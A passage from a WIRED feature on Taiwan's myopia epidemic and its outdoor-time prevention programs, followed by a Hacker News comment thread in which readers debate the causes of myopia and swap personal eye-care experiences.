levels of myopia. They used a technique called “cycloplegic autorefraction,” in which the patient’s eyes are first relaxed with eye drops before a machine measures how light is focused on the back of the eye, providing an objective measure of the length of the eyeball. The results, which were published in a landmark 2008 paper, confirmed Morgan’s suspicions. As expected, overall myopia rates among Australian 12-year-olds, at about 13 percent, were significantly lower than in Asia. Morgan and his team also surveyed the participants about their daily routines and hobbies and discovered a surprising relationship. The more time kids spent outside, the less likely they were to have myopia. The next question was why. “This was where my background became really important,” Morgan says. It all came back, he thought, to dopamine—the neurotransmitter he had been studying before his detour into myopia research. “We knew that light stimulated the release of dopamine from the retina, and we knew that dopamine could control the rate at which the eye elongated,” Morgan says. (In 1989, an American ophthalmologist named Richard Stone found that he could induce myopia in chickens by manipulating light levels, and that there was less dopamine in the retinas of the myopic chickens.) “So once we had the actual epidemiological evidence that being outdoors was important, the mechanism was, to us, very obvious.” Without adequate exposure to sunlight, the eye keeps growing longer, images are focused in front of the retina, and vision becomes blurry. In August 2008—after a decade of research—Morgan published a paper that he believed contained the key to solving Asia’s myopia epidemic. ILLUSTRATION: VANILLA CHI AROUND THIS TIME, Wu’s clinic was busy—his operating table often full, with a steady stream of parents with young children in tow seeking treatments for myopia. For instance, orthokeratology contact lenses improve vision by temporarily squishing the cornea into a different shape, reminiscent of how ancient Chinese soldiers are said to have slept with sandbags over their eyes for the same effect. Then there’s atropine—a muscle relaxant derived from the toxic nightshade and mandrake plants. Nightshade has been known as “belladonna” because women in Renaissance Italy—and maybe even as far back as Cleopatra—used it to dilate their pupils to make them appear larger and more beautiful. Atropine paralyzes the ciliary muscle, which controls the size of the pupil and, for reasons scientists haven’t yet pinned down, also seems to slow down the progression of myopia. (Since 2008, new treatments have become available: miSight contact lenses and MiyoSmart glasses, which arrest the growth of the eye by manipulating light patterns.) In his studies in Taiwan, Wu observed the same phenomenon that Morgan had documented: More outdoor time equaled less myopia. But Wu knew that none of these treatments were dealing with the underlying cause of the problem. And as a newly minted member of Taiwan’s Vision Care Advisory Committee, a different group of academics behind some of the country’s well-meaning but ineffective attempts to tackle nearsightedness, he had adopted a determined, systematic approach to finding a solution. Every week, he gathered his colleagues to review the latest academic research on myopia. He even corralled his mother into making snacks as an added incentive. Sign Up Today Sign up for our Longreads newsletter for the best features, ideas, and investigations from WIRED. During one of these Thursday sessions, with the smell of home-cooked food in the air, Wu discovered Ian Morgan’s research in Australia. It was a eureka moment. Were Taiwan’s classroom interventions failing because kids weren’t spending enough time outside? Wu decided to run his own version of the Sydney Myopia Study in Cimei, an island off the west coast of Taiwan. He observed the same phenomenon: More outdoor time equaled less myopia. Around the same time, Wu chanced on an opportunity to go a step further than Morgan—to move from simply observing the myopia problem to fighting back. His son was starting elementary school, and the parents of incoming students had been invited to an orientation talk. They gathered in a classroom at the school, surrounded by small desks and kids’ drawings on the walls. At the end, the principal opened the floor to questions. Wu raised his hand and voiced his concerns about what Taiwanese schooling might do to his son’s vision. “Under your education system, will he become myopic or not?” MOST POPULAR CULTURE Brazilian Gamers Aren't Waiting for Hollywood.

WOOD SCIENCE Yes, the Climate Crisis Is Now ‘Gobsmacking.’ But So Is Progress MATT SIMON Other hands started going up. One woman had a daughter in the third grade who was already minus 2 diopters, and she feared for her son. Wu saw a chance to put Morgan’s theory into action. At the time, the Taiwanese government was encouraging schools to switch the classroom lights off and send kids outside during breaks—to save electricity, not eyes. Wu convinced the principal of his son’s school to go further and usher the children outside six times a day, which added up to an extra six and a half hours of outdoor time each week. When Wu took measurements at the start of the program, in February 2009, the myopia prevalence among 7- to 11-year-olds at both his son’s school and another school, which he used as a control for his experiment, was around 48 percent. A year later, the control school had almost twice the rate of new cases of myopia as his son’s school. Wu began to preach the gospel of outdoor time, appearing in the media and touring rural Taiwan. On many of the stops, Wu, on guitar, and his wife, on keys, play their own renditions of pop songs with new lyrics about myopia prevention. (A recent effort turned “Despacito” into a ballad about atropine). He wrote a book, Kids Could Be Free From Myopia, outlining the principles of good eye health and how he applied them to slow the progression of myopia in his own young children. “Sometimes,” he says, “we don’t appreciate the free things.” Wu also worked on translating his research findings into a simple program that could be rolled out across the country. To do that, he needed to know how much time kids should spend outdoors. Wu thought back to Ian Morgan’s research, which had found that Australian kids spent an average of 13.5 hours a week outside. Another study suggested 14 hours. And so two hours a day became the cornerstone of Taiwan’s national myopia strategy, launched in 2010. It’s called Tian-Tian 120, which translates to “every day 120,” for the number of minutes children should spend outside each day. At Mingde Elementary School in Kaohsiung, I watched as muzak blasted over the speakers and kids of all ages came streaming outside in their uniforms, grabbing balls and jump ropes. As the school’s principal, Ching-Sheng Chen, proudly showed off the array of outdoor equipment, a boy who couldn’t have been much older than 7 grabbed a unicycle and began riding laps around the playing field. At another school in northeast Taiwan, known for its changeable weather, the playground has been equipped with a giant covered area called “Sunny Square” so the kids can still spend time outdoors when it’s raining.

WOOD SCIENCE Yes, the Climate Crisis Is Now ‘Gobsmacking.’ But So Is Progress MATT SIMON The results of the Tian-Tian 120 program were immediate and impressive. After years of trending upwards, myopia prevalence among Taiwanese primary school children peaked in 2011 at 50 percent, and then started to come down. Within a few years, it was at 46.1 percent. “You can see this very beautiful curve,” Wu says. ILLUSTRATION: VANILLA CHI IN 2014, A young ophthalmologist in Yilan County, on Taiwan’s rugged northeast coast, began a project that he hoped would eradicate high myopia entirely. Der-Chong Tsai—who wears round black frames and a white lab coat and shares Wu’s earnest energy—first became interested in eye health while training at Taiwan’s National Defense Medical Center. From there, he worked at Taipei Veterans General Hospital, and he’d come across Wu’s and Morgan’s work on nearsightedness after completing a PhD in epidemiology in the early 2010s. He was impressed but had a hunch that intervening even earlier than primary school could make a significant difference—not only to slow down the progression of myopia, but to try to stop it from taking hold in the first place. It’s been found that for every year the onset of myopia is delayed, the ultimate severity of the condition is reduced by 0.75 diopters—catch it early enough, and you might be able to prevent a kid from ever needing glasses. “We thought primary school was too late,” Tsai said. “In terms of myopia prevention, the earlier the better.” Taiwan finally seemed to be getting the upper hand in its long fight against myopia. Then Covid hit, and Wu’s beautiful curve began to invert. Yilan County now runs one of the most ambitious myopia prevention programs in the world. Each year, Tsai and his team visit every preschool in the region, running screening tests to look for what’s called “pre-myopia”—the earliest signs of the eyeball getting too long. Tsai wants to catch children whose eyes are already too long for their age—who may not have myopia yet but who might be at higher risk once they start formal schooling. Today, Tsai screens more than 98 percent of preschoolers in Yilan County, and at a cost of just $13 per child, he has found hundreds of cases of pre-myopia that wouldn’t have been spotted until much later, when it was more advanced. The children most at risk of developing myopia are prescribed atropine alongside their time outdoors, and the results have been spectacular. By the end of 2016, after two years, the Yilan program had driven down the prevalence of myopia in the region by 5 percentage points. Between the Tian-Tian 120 initiative, aimed at older kids, and the Yilan program, Taiwan finally seemed to be getting the upper hand in its long fight against myopia.

WOOD SCIENCE Yes, the Climate Crisis Is Now ‘Gobsmacking.’ But So Is Progress MATT SIMON Then Covid hit, and a whole generation of kids were stuck inside for months at a time. Studies show that in China, Turkey, Hong Kong, and India, myopia worsened during the Covid lockdowns. Taiwan was no exception: Wu’s beautiful curve began to invert. IN MARCH 2023, Taiwan lifted its final pandemic restriction, allowing international travelers to visit without having to quarantine. I arrived there half-expecting some mythical Land of the Blind scenario: pavements populated by people with white sticks stumbling into everything, a pair of glasses perched on every nose. It wasn’t like that, of course. Although there were seven eyewear shops within a 10-minute walk of my hotel in Kaohsiung, and the stylized eye logos of oculists all around, like the eerie billboard from The Great Gatsby. There are long-standing cultural forces driving Taiwan’s myopia boom—the emphasis on education and a notion that paler skin is more attractive both conspire to keep people inside. Navigating the organized chaos of traffic snarls in cities like Taipei and Kaohsiung, I couldn’t help but think how difficult it would be for someone with impaired vision to get around, and how challenging it is to find safe outdoor spaces for children to play in the sun in such a dense metropolis.

On our current trajectory, viral diseases, air pollution, and extreme heat are just some of the things that will continue to keep young children indoors. By 2050, according to the International Myopia Institute, 10 percent of the world’s population will have high myopia, and up to 70 percent of them will have pathologic myopia—the kind that causes blindness. That’s as many as 680 million people affected by vision loss or blindness, with catastrophic effects for economies and health care systems. In that sense, Taiwan’s myopia boom is a blurry glimpse of a potentially blurred future: one where technology has to compensate for the societal changes that are driving nearsightedness. Ian Morgan has been involved in prototypes of glass-walled classrooms in China, enabling children to get the benefit of time outdoors without having to cut back on education. Other research suggests that shining a bright red light directly into the eye with a special machine may slow the progression of myopia. But many of the existing treatments are expensive, and they don’t work for everyone. Some ophthalmologists predict a future where bad eyesight, like crooked teeth, becomes a marker of an impoverished childhood. Others argue that myopia prevention should be publicly funded—that, like programs to encourage people to quit smoking or exercise regularly, a little funding now will save a lot in the future. “Prevention is better than cure,” is one of Pei-Chang Wu’s mantras. While children in Taiwan’s Yilan County experienced the pandemic years much the same as kids everywhere—less time outdoors and more time watching screens—intervening when children are quite young has proven to be the best strategy: Across the county, myopia rates in preschoolers remained stable throughout the lockdowns. Technology and industrialization may have contributed to the myopia problem, but sometimes the best solutions are cheap and simple. Just go outside, and see.

I spent hours outside, maybe school caught up with me I was myopic by 2nd grade. I heard about that focus shift far, short, far is a big part. I taught my kid to focus up on tall buildings we can see. I&#x27;m between Murray hill and Gramercy in Manhattan, we have some views out our window and my now 15 year old has perfect vision. Eye Doctor assumes his eye is mostly if not full grown and he escaped the last couple of generations on both sides of the family. His success is more the focus changes than lots of daylight. Daylight surely helps with mood so I did teach him to get 20 even 30 minutes of daylight into his retina but not hours. reply svnt 18 hours agoprevThe upshot is that dopamine regulates eye lengthening, and more light stimulates more dopamine.Based on recent studies in Australia and Asia they recommend two hours of daily time outdoors for children to prevent myopia.So it isn’t caused by looking at things close up, the confound was that people who spend a lot of time looking at things close up tend to do so under artificial light. reply arrowleaf 17 hours agoparentThree years ago at age 25 I booked an eye exam due after getting some new floaters. After imaging my eye doc came in and asked if I was comfortable driving while dilated, because he would be dilating and numbing my eyes before sending me off to the retina specialist for an urgent exam. The ophthalmologist immediately diagnosed me with lattice degeneration and saw a horseshoe tear. That same afternoon he sat me in a chair and used a laser to create a barrier of scar tissue around the tear to prevent it from progressing. Three years later I have had two rounds of prophylactic treatment of those weak spots in each eye. I most likely will never experience a retinal detachment, but annual dilated eye exams are in my future.I don&#x27;t even have very bad myopia (-2.75&#x2F;-3.25), but I kick myself for not spending as much time outside during my childhood as some of my friends did. reply green-salt 17 hours agorootparentI had the exact same situation happen, except my optometrist was visibly concerned.

Brain freeze, but extremely acute and right behind your eyeball might be accurate. During one of the prophylactic treatments he did some &#x27;spot welds&#x27; near my optic nerve.

Furthermore, NIR light may also boost cerebral blood flow and cognitive functions in humans without adverse effects. In this review, we highlight the value of NIR therapy as a novel paradigm for treatment of visual and neurological conditions, and provide scientific evidence to support the use of NIR therapy with emphasis on molecular and cellular mechanisms in eye diseases.\" [1]NIR = near infrared light, 670 nm wavelength. This wavelength is present in sunlight, but not found in basically any indoor lighting with the possible exception of full spectrum LEDs and IR bulbs. Another study found improvement from NIR exposure, but only from exposure in the morning (for three minutes, once a week, at 670nm wavelength), and only in individuals older than 38. The study proposes that the effects they found from NIR exposure is due to improved mitochondrial function in the retina. [2]The human retina ages faster than other organs, with a 70% decline in functional ATP production by mitochondria over a lifetime. The aging mitochondria, in addition to not producing as much ATP, also spit out junk amino acids that can cause chronic inflammation in the area (and signal cell death where none is called for?). As an aside, improved mitochondrial function is also proposed to be responsible for the significant health benefits of fasting and prolonged calorie restriction.Another study also theorizes this mechanism:\"Our data suggest, 670 nm light can significantly improve aged retinal function, perhaps by providing additional adenosine triphosphate production for photoreceptor ion pumps or reduced aged inflammation.\" [3]More study is clearly called for the better understand what is going on here and why. It seems like it could potentially have implications for age-related degeneration throughout the entire body, not just in the retina.[1] https:&#x2F;&#x2F;www.ncbi.nlm.nih.gov&#x2F;pmc&#x2F;articles&#x2F;PMC7738953&#x2F;\\\\ [2] https:&#x2F;&#x2F;academic.oup.com&#x2F;biomedgerontology&#x2F;article&#x2F;75&#x2F;9&#x2F;e49&#x2F;...

A person who needs a vision prescription of -6.00 diopters (D) or more has high myopia ... It&#x27;s very important to manage myopia progression during childhood, before it becomes high myopia. Myopia typically begins during early childhood and progresses over time. The peak years of myopia progression are roughly between ages 7 and 15.5 ... For about 50% of people, myopia stabilizes by age 15, but it can progress until around age 24 for others. Low and moderate myopia fall between -0.25 D and -5.75 D.High myopia causesNearsightedness primarily occurs as the result of a slightly elongated eyeball shape. When the eyeball is too long, light focuses too far in front of the retina. This causes distant objects to look blurry ... Inherited genes can play a role in the development of high myopia. Children have a greater risk of developing the condition when one or both parents have nearsightedness.Severe myopia does not generally lead to vision loss on its own. Instead, the progressive lengthening of the eyeball stretches and thins the retina and other eye tissues.

When I&#x27;ve heard other people, sometimes doctors, speak as though that somehow caused my high myopia, or my sister&#x27;s, it has struck me as obviously laughable. The sunlight theory is interesting.My sister and I also share an inherited retinal disease that causes photophobia (severe light sensitivity). Because the disease is progressive (degenerative) and we were only diagnosed as adults, we never had any ERGs taken as kids, so we don&#x27;t know whether or how it was affecting us then. But from even pre-school, I remember walking around with not just my face pointed down, but my eyes closed, opening them only every couple seconds, in order to escape the extremely bright sun where we lived. So does she.I wonder if to some extent, our early visual impairments and light sensitivity exacerbated our myopia by making outdoor times and outdoor activity less rewarding for us.Aside: as someone with high myopia, content like this, seemingly fixated on preventing, curing or &#x27;ending&#x27; myopia, reminds me a lot of some things I&#x27;ve seen on Reddit. Out of some personal interest, I sometimes browse r&#x2F;myopia as well as r&#x2F;blind. And it strikes me over and over how r&#x2F;blind seems like a much more sane place to me. r&#x2F;myopia is full of people absolutely panicking over myopia that is fully correctable! It&#x27;s got post after post of people desperately trying to &#x27;reverse&#x27; their myopia, people going to great lengths to try to shave one or two diopters. Many posters there describe feeling depressed and deflated by their first prescriptions, obtained in adolescence or young adulthood, and anxious about the future.I&#x27;ve never really known what it&#x27;s like to have normal vision. In that sense, I know I&#x27;m inclined to underestimate the sense of loss that some people will naturally and rightly feel when their once-perfect vision degrades. But I can&#x27;t help but look at r&#x2F;myopia and think it all seems a bit unhinged. It&#x27;s strange to watch people with highly correctable vision, whose vision will likely never seriously affect their mobility, independence, or work act like the sky is falling because they&#x27;re nominally myopic while half of my immediate family is blind or slowly going blind.In contrast to r&#x2F;myopia, r&#x2F;blind seems so much more grounded. There&#x27;s grief and worry there also, but for the most part, people posting there are just figuring out how to live their lives. It&#x27;s a place that feels much less depressing, much less despairing, to me.To some extent, I think the OP and the shift in thinking it describes is aligned with r&#x2F;myopia, while the older view that myopia is largely genetic and something more to be managed than to avoided, with r&#x2F;blind. I think from a public health perspective, interventions like the OP describes are absolutely warranted. But when it comes to individuals, I think a lot of people would serve themselves better by taking up a looser posture. Even &#x27;high&#x27; myopia is extremely manageable, if that&#x27;s all you&#x27;ve got going on. It&#x27;s not the end of the world to be myopic (or even to be blind, as a brief scroll through r&#x2F;blind makes clear). By all means, let school systems and health departments and scientists keep working out how to address myopia at scale.

This means that it isn&#x27;t genetic, something environmental must have changed to cause this.[0] https:&#x2F;&#x2F;archive.ph&#x2F;9TlOG reply cyberax 8 hours agorootparentprevFor swimming, you can get prescription goggles. That makes snorkeling a completely different experience, you can actually _see_ things on the seafloor.For other types of sports, you can wear contact lenses. Even if you&#x27;re not comfortable wearing them all the time (I certainly am).Last year I decided to get a laser eye surgery (PRK), and I&#x27;m now enjoying clear vision without glasses. reply toast0 7 hours agorootparentYes, I can, but 6th grader me couldn&#x27;t.Actually nicer are cheap goggles from amazon with a close enough prescription, because they&#x27;re cheap.I&#x27;m not sticking contacts or lasers in my eyes either, thanks. reply lhamil64 13 hours agorootparentprevRegarding swimming, you could get prescription goggles reply danaris 16 hours agorootparentprevOn the other hand:By the time I was...probably about 12, my myopia was bad enough that I could no longer read without glasses (or without holding the book uncomfortably close to my face). Similarly, attempting to interact with a screen would&#x27;ve been impractical, because it&#x27;s all fine detail.Outdoors, however, most things that I would need to care about were large enough that I could see them just fine. I wouldn&#x27;t have had much trouble, for instance, playing soccer without my glasses on, because I didn&#x27;t need to care which face was which or even the numbers on the backs of the shirts—I just needed to see the colors of the shirts, and the position of the ball, well enough to maneuver between them. (Well, I wouldn&#x27;t have had trouble due to my myopia. The trouble I had playing soccer was from a different source.)...I have literally never encountered an amusement park where I couldn&#x27;t wear my glasses. It seems to me that if there&#x27;s really a danger, they should provide some kind of protection for you. reply amluto 10 hours agorootparentThere are amusement parks that don’t allow non-prescription sunglasses on rides. But sometimes the operators don’t ask if they’re prescription, and you need to tell them that your sunglasses are prescription. reply dghughes 17 hours agoparentprevAs a child of the 1970s and a teen in the early 1980s I was outside more than in even in cold Canadian winters. I have bad astigmatism and I&#x27;m also near or far sighted (can never recall which).I know just my own life doesn&#x27;t nullify the statement but all my friends were the same I mean outside but I don&#x27;t know of them who has glasses as adults. reply toast0 17 hours agorootparent> I&#x27;m also near or far sighted (can never recall which).Take off your glasses and try to read a book at arm length, and close up. If you can easily read it at both distances, you might have good vision. If you can only read it when it&#x27;s far, you are far sighted. If you can only read it when it&#x27;s near, you&#x27;re near sighted. reply dghughes 14 hours agorootparentlol I can&#x27;t see either way and now I have bifocals too. reply netule 17 hours agorootparentprev> can never recall whichDo your glasses magnify or reduce things? The former is for aiding hyperopia and the latter for myopia.Also, as far as I can recall, astigmatism is present at birth and not developed over time like some other eye conditions. reply dghughes 14 hours agorootparentI have astigmatism and now presbyopia too so if I remove my glasses and try to see if they magnify or reduce thing I&#x27;m not able to see because I can&#x27;t see without my glasses. lol reply nottorp 17 hours agorootparentprevYep, I have astigmatism. I spent my childhood more outdoors than indoors but I already had it.Only started to get dioptries at 30 ish but the astigmatism was with me all my life. reply antisthenes 17 hours agorootparentprev> Also, as far as I can recall, astigmatism is present at birth and not developed over time like some other eye conditions.No, it&#x27;s definitely not present at birth (at least to the same degree) and can be acquired during child development and even early adulthood. reply wozniacki 17 hours agorootparentprevnext [–]I know just my own life doesn&#x27;t nullify the statement but all my friends were the same I mean outside but I don&#x27;t know of them who has glasses as adults.This statement is confusing. And this is something I&#x27;m super keen to learn more about. So lets see if I understand this correctly.You mean you _do not_ know of any friends who _do not_ wear eyeglasses as adults?Let me rephrase that. You played outside as a child. You now wear glasses. All of your friends played outside as well. All your friends now wear glasses as well.Is that correct? reply dghughes 14 hours agorootparentYeah it was a bit confusing.My friends and I played outside as children. I began to wear eyeglasses at age 17. My friends at the time to the best of my knowledge did not wear eyeglasses (ages 0 to 18). I do not know any of the same people now so I cannot say if they as adults wear eyeglasses or not. reply slothtrop 17 hours agoparentprevI wonder if China will implement a policy to this effect, since they have the largest demographic dependent on eyeglasses in the world. reply nsonha 17 hours agoparentprevI don&#x27;t know why western media always talks about myopia (in Asia) as if it&#x27;s some sort of mystery. Where I&#x27;m from, everyone believes that myopia is caused by... the habit of looking at close objects for prolonged periods, such as electronic devices or books. Like how shocking (it should not if you know how muscles around your eyeballs work). I think it&#x27;s even written so in the textbooks. reply bryanlarsen 17 hours agorootparentYes, that&#x27;s a common belief in the West as well, and used to be generally accepted. But there&#x27;s a very strong correlation between looking at close objects for prolonged periods and being inside so it&#x27;s easy to understand why it was misunderstood for so long. reply nsonha 17 hours agorootparentyou seem to think the real cause is \"being inside\" and not using your eyes in a particular way? (looking at close objects...). What is the exact mechanism by which being inside affects your eyes then? reply smallnix 17 hours agorootparentPlease read the article. Its about that.I&#x27;ll try to explain what I understood from the article: the natural sunlight makes your body release dopamine, dopamine causes the eye not to elongate, not elongation equals not having near-sightedness.Probably I got that only half right.Anyhow the article claims it&#x27;s not looking at close things and the real cause is being inside. reply jgtrosh 17 hours agorootparentprev> There is preliminary evidence that the protective effect of outdoor activities on the development of myopia is due, at least in part, to the effect of long hours of exposure to daylight on the production and the release of retinal dopamine. reply nsonha 17 hours agorootparentthank you, I skimmed over this in the article reply cromulent 17 hours agorootparentprevThat&#x27;s the subject of the article. reply croes 17 hours agorootparentprevArtificial lighting? Less sunlight? Lower light intensity? reply nsonha 17 hours agorootparentyes, there is a theory on how the muscles of the eyes become \"miscalibrated\", so to speak, if you only look at close things. What is the exact mechanism of the \"lower light\" theory then? replygniv 2 hours agorootparentprevThis used to be the leading theory, indeed. Turns out it was wrong, as the article explains. reply arrowleaf 17 hours agorootparentprevClose-up work (crafts, reading, computers) causing myopia &#x27;makes sense&#x27;, I heard the same thing as a kid in the States.It makes me wish we would have had more P.E. classes outside, rather than &#x27;giving our eyes a break&#x27; by playing kickball indoors under fluorescence. reply nsonha 17 hours agorootparentthe problem with playing indoor is that your \"eye break\" only goes so far as the walls of the space, still \"close objects\" in relative terms. In nature, humans use their eyes to gaze landscape, stars... really far things. reply arrowleaf 17 hours agorootparentWell, the real problem is that children&#x27;s eyes aren&#x27;t getting enough sunlight exposure to trigger dopamine production, which regulates the lengthening of the eyeballs, while cooped up inside. Eye strain is muscle fatigue, unrelated to myopia. reply garblegarble 17 hours agorootparentprevMy understanding is that 20 feet or so is optical infinity, so whether you&#x27;re looking at an object 20 feet away or 20 light years away, your eye muscles are just as relaxed (hence the 20-20-20 recommendation: every 20 minutes, stare at an object 20 feet away for 20 seconds) reply antisthenes 16 hours agorootparentI don&#x27;t know about you, but where I spent my childhood, most things indoors were much closer than 20 feet away.That&#x27;s a fairly large room, and we typically don&#x27;t focus on the furthest point while indoors anyway. So with the 20ft requirement, it&#x27;s a lot easier to fulfill while being outdoors. reply garblegarble 16 hours agorootparentOh yeah definitely - I was purely commenting on the parent comment&#x27;s \"really far\" claim, and noting that it&#x27;s all the same to the eye muscles once you hit 20 feet - you don&#x27;t have to (no pun intended) set your sights on the stars to relax your eye muscles. replymschuster91 17 hours agoparentprevThe problem is everyone and their dog wants urbanization, and dense urbanization at that. Be it for environmental reasons (land use, reduction of individual car traffic), for financial reasons (easier to supply dense areas with infrastructure like water&#x2F;electricity&#x2F;public transit, at least up until a certain point) or for the benefit of employers (a large, concentrated talent pool).The downsides however? We&#x27;re completely ignoring them for whatever reason, and increasing myopia and rising child obesity rates are just one point on the giant list. reply munk-a 17 hours agorootparentPersonally, I want urbanization to fight against obesity - walkable cities produce a lot more natural and casual physical activity than living in suburbia and needing to drive three miles to pick up a can of coke.Good urbanization also, I believe, would discourage myopia. I&#x27;ve spent the past few months living in Barcelona and nearly everything here happens outside in the sun - going for dinner, meeting friends, playing a board game... people tend not to do as much inside under florescent lights when usable, comfortable, and safe outdoor spaces are available. reply fallingfrog 10 hours agoprevI’ve got better than 20&#x2F;20 vision and I can focus just fine on the moon, and I haven’t got the slightest clue why my vision is good and other people have myopia. My parents didn’t let me have a lot of sugar as a child (we never ate fast food, no soda in the house), I don’t see that being studied much.. pure speculation on my part of course. reply thriftwy 9 hours agoparentI have a friend whose mother was a pilot (great vision) and he also has good vision (at least he used to, back then).I don&#x27;t think he spent more time outdoors than I did or stared at screens less than myself. He is not any less geeky than me.So the question is, what do we do to give happiness to everybody, for free (or at least inexpensively). reply Aerbil313 17 hours agoprev [–] Didn’t read the article. But currently curing my own myopia with measureable improvement. Yes, I know it’s impossible whatever. It’s happening. I believe what I see with own eyes (pun fully intended).

Your results are irrelevant and minor changes could simply be due to choroid thickness changes. There are comments like yours on every myopia post where people claim minor changes (1-2 diopters) then are never heard from again. reply walterbell 10 hours agorootparentVision therapy (with or without a professional advisor) works for some people, but not others. We don&#x27;t know why. reply Aerbil313 11 hours agorootparentprevI&#x27;m sorry, simply no. I know myopia is supposed to be not reversible. No one knows how these methods work. But they work, and I&#x27;m so happy I&#x27;ll be able to get rid of my glasses without laser surgery, I can&#x27;t care less about what science or people currently say. reply aeternum 9 hours agorootparentprevThis is definitely not true. Pregnancy for example is known to cure myopia in some cases: https:&#x2F;&#x2F;www.ncbi.nlm.nih.gov&#x2F;pmc&#x2F;articles&#x2F;PMC5519268&#x2F;Furthermore there are contact lenses that temporarily reshape the surface of the eye as well as new glasses, both of which are now either FDA approved or in late-stage trials. reply donkers 9 hours agorootparentFrom the study you linked:\"A likely explanation of the inverse association between pregnancy and myopia progression is the higher exposure to outdoor activities in pregnant women during their maternal leaves. Time of outdoors physical activity of 6.9 vs 5.2 h per week (P=0.002) in pregnant woman compared to non-pregnant woman.\"Outdoor activities - the same thing as in the Wired article that&#x27;s noted to slow down myopia progression. I don&#x27;t think this study supports what you think it supports.Also myopia didn&#x27;t reverse, the rate of increase merely slowed down in the pregnant women. reply stevebmark 9 hours agorootparentprevRead the study you linked to.

The only thing NottNott disagrees here based on experience (I don&#x27;t have a precise opinion on it) is that avoidance of screens are not necessary whatsoever, as long as you are getting your daily ~2 hour active focus distance vision (walk). reply walterbell 10 hours agorootparentScreen avoidance isn&#x27;t necessary, but 20-20-20 breaks do allow ciliary focusing muscles to periodically relax during closeup sessions. reply gus_massa 17 hours agoparentprev [–] Do they have a double blind randomized controled trial published in a seserious journal?The double blind part is difficult, but they usualy give a silly task to the control group, so they don&#x27;t know they are in the control group. reply walterbell 17 hours agorootparentThere&#x27;s no generic method that could be tested, but studies on specific topics are linked here, https:&#x2F;&#x2F;wiki.endmyopia.org&#x2F;wiki&#x2F;Clinical_Studies reply userbinator 10 hours agorootparentprevDouble \"blind\"...? reply Aerbil313 11 hours agorootparentprev [–] I literally don&#x27;t care on its effectivity in the general population or else, I&#x27;m so happy and grateful it&#x27;s working on me. replyGuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
